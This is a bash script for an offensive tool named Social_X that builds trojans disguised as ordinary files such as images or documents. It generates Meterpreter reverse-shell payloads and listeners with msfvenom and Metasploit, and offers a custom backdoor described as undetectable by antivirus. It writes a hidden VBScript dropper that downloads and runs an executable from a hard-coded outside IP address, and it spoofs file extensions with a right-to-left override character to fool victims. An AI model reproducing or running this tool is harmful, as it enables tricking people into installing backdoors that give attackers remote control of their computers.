lightblue=`tput setaf 14` 
green=`tput setaf 46`     
RED=`tput setaf 196`      
yellow=`tput setaf 11`    
purple=`tput setaf 129`   
reset=`tput sgr0` 
clear
function banner(){
    echo ${green}
    figlet Social_X -f banner/larry3d.flf 
    echo ${green} ------------------------------------------------------------------
    echo -e "                         By:Aziz Kaplan" 
    echo -e "                          Version:1.1" 
    echo ${green} ------------------------------------------------------------------
}

    
function cleaner() {
    rm SOCIALX_EXE/*.exe
}  

function binder() {
    cleaner
    clear
    banner
    echo ${RED}
    echo -e "${red}[!]${yellow}File Name Has To Be Same With The File Name That You Want To Embed Otherwise Tool Will Not Work Properly!" 
    echo ${lightblue}
    echo -e "${green}[+]${lightblue}Enter The File Name That You Want To Embed(it could be jpg,docx,png etc.)"
    read -p  "==>" file
    IN="$file" 
    set -- "$IN" 
    ext_spoof=$(echo $file | cut -d "." -f 2 | rev)

    echo "${purple}[+]${green} Have You Created A Backdoor?(Y/N or yes/no)"
    read  -p "==>" ask

    if [[ $ask == "y" || $ask == "yes" || $ask == "YES" || $ask == "Y" ]]
        then
            echo -e "${red}[!]${yellow}File Name Has To Be Same With The File Name That You Want To Run Otherwise Tool Will Not Work Properly!" 
            echo "${green}[+]${lightblue}Enter The File Name That You Want To Run(It is an exe file mostly.)\n"
            read -p "==>" exe_file
            echo ${lightblue}
            echo  -e "\n${green}[+]${lightblue}Import The '$file' AND '$exe_file' Files To The Social_X Server"
            checker=$(curl http://34.253.220.69/$file -s | grep 404)
            if [[ $checker = "<title>404 Not Found</title>"  ]];then 
                    echo "${green}[+]This Name Is Available For File $file"
                    echo "${green}[+]${lightblue}Import The '$file' and '$exe_file' to socialx server."
                    chromium http://socialx-project.ml  2> /dev/null 
            else
                    echo "${red}[-]Please Choose Another Name.This Name IS Already IN The Server $file"
                    exit
            fi
            checker1=$(curl http://34.253.220.69/$exe_file -s | grep 404)
            if [[ $checker1 = "<title>404 Not Found</title>"  ]];then 
                    echo "${green}[+]This Name Is Available:$exe_file"
            else
                    echo "${red}[-]Please Choose Another Name.This Name IS Already IN The Server $exe_file"
                    exit
            fi

           
    elif [[ $ask == "n" || $ask == "no" || $ask == "NO"  || $ask == "N" ]] ;then
        echo -e "${green}[+]${lightblue}Enter The File Name That You Want To Run[Input The Name With Extension]\n"
        read -p "==>" exe_file
        clear
        banner
        checker=$(curl http://34.253.220.69/$file -s | grep 404) 
        if [[ $checker = "<title>404 Not Found</title>"  ]];then 
            echo "${green}[+]This Name Is Available For File $file"
        else
            echo "${red}[-]Please Choose Another Name.This Name IS Already IN The Server $file"
            exit
        fi
            checker1=$(curl http://34.253.220.69/$exe_file -s | grep 404)
        if [[ $checker1 = "<title>404 Not Found</title>"  ]];then 
            echo "${green}[+]This Name Is Available:$exe_file"
            clear
            banner
            echo -e "${green} [#]${lightblue}Choose A Backdoor Option:"
            echo -e "${green} |1|->${lightblue}Socialx Exe Trojan(FUD-IT IS NOT DETECTABLE[Aziz's Fresh Algorithm])\n"
            echo -e "${green} |2|->${lightblue}Metasploit Exe Trojan(NOT FUD-IT IS DETECTABLE)"
            echo -e "${green} |3|->${lightblue}Metasploit Hta Trojan(NOT FUD-IT IS DETECTABLE)"
            read -p "${purple}==>" backdoor_option
            if [[ $backdoor_option = "3"  ]];then

                private_ip=$(sudo ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')
                read -p "${green}[+]${lightblue}LHOST[Default:$private_ip]-->" ip
                read -p "${green}[+]${lightblue}LPORT-->" port
                if [[ $ip = "" ]];then
                    echo use exploit/windows/misc/hta_server > Metasploit/socialx.rc
                    echo set SRVHOST $private_ip >> Metasploit/socialx.rc
                    echo set URIPATH socialx >> Metasploit/socialx.rc
                    echo set PAYLOAD windows/meterpreter/reverse_tcp >> Metasploit/socialx.rc
                    echo set LHOST $private_ip >> Metasploit/socialx.rc
                    echo set LPORT $port >> Metasploit/socialx.rc
                    echo exploit -j -z >> Metasploit/socialx.rc
                else
                    echo use exploit/windows/misc/hta_server > Metasploit/socialx.rc
                    echo set SRVHOST $ip >> Metasploit/socialx.rc
                    echo set URIPATH socialx >> Metasploit/socialx.rc
                    echo set PAYLOAD windows/meterpreter/reverse_tcp >> Metasploit/socialx.rc
                    echo set LHOST $ip >> Metasploit/socialx.rc
                    echo set LPORT $port >> Metasploit/socialx.rc
                    echo exploit -j -z >> Metasploit/socialx.rc
                fi
                echo -e "${green}[+]${lightblue}Your Trojan IS in SOCIALX_BACKDOOR/ directory."
                
                echo msfconsole -r Metasploit/socialx.rc > socialx_backdoor.sh
                chmod 755 socialx_backdoor.sh
                echo -e "${green}[+]${lightblue}Connection Will Be Established After 3 Minutes Victim Clicks."
		 xterm -hold -e ./socialx_backdoor.sh &
                sleep 25
                curl http://$private_ip:8080/socialx/socialx.hta -o $exe_file
                clear
                banner
                echo "${green}[+]${lightblue}Your Backdoor Has To Be In The Social_X/ Folder."
                wine /home/kali/.wine/drive_c/Program\ Files\ \(x86\)/dennisbabkin.com/Script\ Encoder\ Plus/ScrEncGui.exe /dev/null 2> /dev/null 
                zip $exe_file.zip $exe_file
                rm $exe_file
                cp $exe_file.zip SOCIALX_BACKDOOR/
                rm $exe_file
                rm *.zip
                chromium http://socialx-project.ml  2> /dev/null 
            elif [[ $backdoor_option = "2" ]];then
                private_ip=$(sudo ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')
                read -p "${green}[+]${lightblue}LHOST[Default:$private_ip]-->" ip
                read -p "${green}[+]${lightblue}LPORT-->" port
                

                if [[ $ip = "" ]];then
                    sudo msfvenom -p windows/meterpreter/reverse_https LHOST=$private_ip LPORT=$port -f exe > SOCIALX_BACKDOOR/$exe_file
                    echo use exploit/multi/handler > Metasploit/socialx.rc
                    echo set LHOST $private_ip >> Metasploit/socialx.rc
                    echo set PAYLOAD windows/meterpreter/reverse_https >> Metasploit/socialx.rc
                    echo set LPORT $port >> Metasploit/socialx.rc
                    echo exploit -j -z >> Metasploit/socialx.rc
                else
                    sudo msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$port -f exe > SOCIALX_BACKDOOR/$exe_file
                    echo use exploit/multi/handler > Metasploit/socialx.rc
                    echo set PAYLOAD windows/meterpreter/reverse_https >> Metasploit/socialx.rc
                    echo set LHOST $ip >> Metasploit/socialx.rc
                    echo set LPORT $port >> Metasploit/socialx.rc
                    echo exploit -j -z >> Metasploit/socialx.rc
                fi
                echo -e "${green}[+]${lightblue}Your Trojan IS in SOCIALX_BACKDOOR/ directory."
                
                echo msfconsole -r Metasploit/socialx.rc > socialx_backdoor.sh
                chmod 755 socialx_backdoor.sh
		echo "${green}[+]${lightblue}Connection Will Be Established After 3 Minutes Victim Clicks."
                xterm -hold -e ./socialx_backdoor.sh &
                clear
                banner
                chromium http://socialx-project.ml  2> /dev/null 
            elif [[ $backdoor_option = "1"  ]];then
                python PYTHON/socialx_encrypter.py
                sleep 5
                wine $HOME/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile PYTHON/socialx_backdoor.py
                cp dist/socialx_backdoor.exe SOCIALX_BACKDOOR/
                rm *.spec
                rm PYTHON/*.spec
                rm -r dist/ build/
                mv SOCIALX_BACKDOOR/socialx_backdoor.exe SOCIALX_BACKDOOR/$exe_file
                clear
                banner
                xterm -hold -e python PYTHON/server.py &
                echo "${green}[+]Upload The $exe_file and $file to the socialx server."
                echo "${green}[+]You have to wait until you see the 'File Has Been Sucessfully Uploaded' page."
                chromium http://socialx-project.ml  2> /dev/null 

            fi

        else
                echo "${red}[-]Please Choose Another Name.This Name IS Already IN The Server $exe_file"
                exit
        fi
        
    fi
    visualbasic
    ########################################################################################################################
    echo -e ${yellow}"\n[+]Vbs To Exe Will Be Started Make The Necesarry Changes.\n"
    echo  -e "\n${RED}[!]${lightblue}PLEASE CONVERT THE FILE IN 'Social_X/SOCIALX_EXE/' FOLDER OTHERWISE TOOL WILL NOT WORK PROPERLY!"
    sleep 7
    wine $HOME/.wine/dosdevices/c:/Program\ Files/Vbs\ To\ Exe/Vbs_To_Exe.exe /dev/null 2> /dev/null  
    mv SOCIALX_EXE/*.exe SOCIALX_EXE/socialx$ext_spoof.exe
    look_zip=$(ls -l | awk {'print $9'} | cut -d "." -f 2)

    left2right
  
    clear
    banner
    #echo  -e "${green}[+]${lightblue}Socialx Recommends You To Make Some Changes In The Hex Code Of The Winrar Zipped File For A Better Social Engineering."
    #echo  -e "${green}[+]${lightblue}1-)You Should Go To End Of The Hex Code Line"
    #echo  -e "${green}[+]${lightblue}2-)You Should Change The '.exe' Extenstion To The Extension That You Want Victim To See."    
    #echo "${RED}[!]${green}Do You Want To Use Hex Code Editor?"
    #read -p "->" hex
    #if [[ $hex == "y" || $hex == "yes" || $hex == "Y" || $hex == "YES" ]];then
    #    echo "${green} -------------------------------------------"
    #    echo  -e "${green}  [1]${lightblue}Hexcurse[CLI]"
    #    echo  -e "${green}  [2]${lightblue}Hexeditor[CLI]"
    #    echo  -e "${green}  [3]${lightblue}Okteta[GUI-EASY USAGE]"
    #    echo -e "${green} -------------------------------------------\n"
    #    read -p "${yellow} ==>" hex_editor
    #    case $hex_editor in 
    #        "1")
    #            hexcurse SOCIALX_EXE/*.zip ;;
    #        "2")
    #            hexeditor SOCIALX_EXE/*.zip ;;
    #        "3")
    #            okteta SOCIALX_EXE/*.zip ;;
    #        *)
    #            echo "EXITING..."
    #            exit
    #    esac
    #fi

    ########################################################################################################################

}
function visualbasic() {     
    binder_vbs_code='set oShell = CreateObject ("Wscript.Shell")'
    binder_vbs_code1='Dim strArgs'
    binder_vbs_code2='Dim strArgs1'
    binder_vbs_code3='Dim strArgs2'
    binder_vbs_code4='Dim strArgs3'
    binder_vbs_code5='strArgs = "cmd /c curl http://34.253.220.69/'$file' -o %homepath%/AppData/Local/Temp/'$file'"'
    binder_vbs_code6='strArgs1 = "cmd /c curl http://34.253.220.69/'$exe_file' -o %homepath%/AppData/Local/Temp/'$exe_file'"'
    binder_vbs_code7='strArgs2 = "cmd /c start %homepath%/AppData/Local/Temp/'$file'"'
    binder_vbs_code8='strArgs3 = "cmd /c start %homepath%/AppData/Local/Temp/'$exe_file'"'
    binder_vbs_code9='oShell.Run strArgs, 0, false'
    binder_vbs_code10='WScript.Sleep(2000)'
    binder_vbs_code11='oShell.Run strArgs2, 0, false'
    binder_vbs_code12='oShell.Run strArgs1, 0, false'
    binder_vbs_code13='WScript.Sleep(180000)'
    binder_vbs_code14='oShell.Run strArgs3, 0, false'
    
    ########################################################################################################################
    echo $binder_vbs_code > SOCIALX_VBS/socialx.vbs
    echo $binder_vbs_code1 >> SOCIALX_VBS/socialx.vbs
    echo $binder_vbs_code2 >> SOCIALX_VBS/socialx.vbs
    echo $binder_vbs_code3 >> SOCIALX_VBS/socialx.vbs
    echo $binder_vbs_code4 >> SOCIALX_VBS/socialx.vbs
    echo $binder_vbs_code5 >> SOCIALX_VBS/socialx.vbs
    echo $binder_vbs_code6 >> SOCIALX_VBS/socialx.vbs
    echo $binder_vbs_code7 >> SOCIALX_VBS/socialx.vbs
    echo $binder_vbs_code8 >> SOCIALX_VBS/socialx.vbs
    echo $binder_vbs_code9 >> SOCIALX_VBS/socialx.vbs
    echo $binder_vbs_code10 >> SOCIALX_VBS/socialx.vbs
    echo $binder_vbs_code11 >> SOCIALX_VBS/socialx.vbs
    echo $binder_vbs_code12 >> SOCIALX_VBS/socialx.vbs
    echo $binder_vbs_code13 >> SOCIALX_VBS/socialx.vbs
    echo $binder_vbs_code14 >> SOCIALX_VBS/socialx.vbs


}
function left2right() {
    echo "${green}[+]${lightblue}Chromium Will Be Opened.Please Click To ${RED}COPY ${lightblue} Button."
    chromium https://unicode.flopp.net/c/202E /dev/null 2> /dev/null 
}

binder

    
